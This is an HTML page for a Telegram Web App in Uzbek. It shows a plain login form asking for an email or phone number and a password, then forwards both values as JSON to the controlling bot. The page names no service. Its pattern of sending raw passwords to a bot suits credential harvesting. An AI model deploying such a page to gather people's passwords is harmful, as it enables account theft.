<!DOCTYPE html>
<html>
<head>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 80%; max-width: 300px; text-align: center; }
        h2 { color: #0088cc; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
        button { background: #0088cc; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-card">
        <h2>🔐 Tizimga kirish</h2>
        <input type="email" id="email" placeholder="Email yoki Telefon">
        <input type="password" id="pass" placeholder="Parol">
        <button onclick="sendData()">Kirish</button>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand(); // Oynani to'liq ochish

        function sendData() {
            let email = document.getElementById("email").value;
            let pass = document.getElementById("pass").value;
            
            if(email === "" || pass === "") {
                alert("Iltimos, barcha maydonlarni to'ldiring!");
                return;
            }

            // Ma'lumotni JSON ko'rinishida botga yuboramiz
            let data = {
                email: email,
                pass: pass
            };
            tg.sendData(JSON.stringify(data)); 
            tg.close(); // Ma'lumot ketgach oynani yopish
        }
    </script>
</body>
</html>
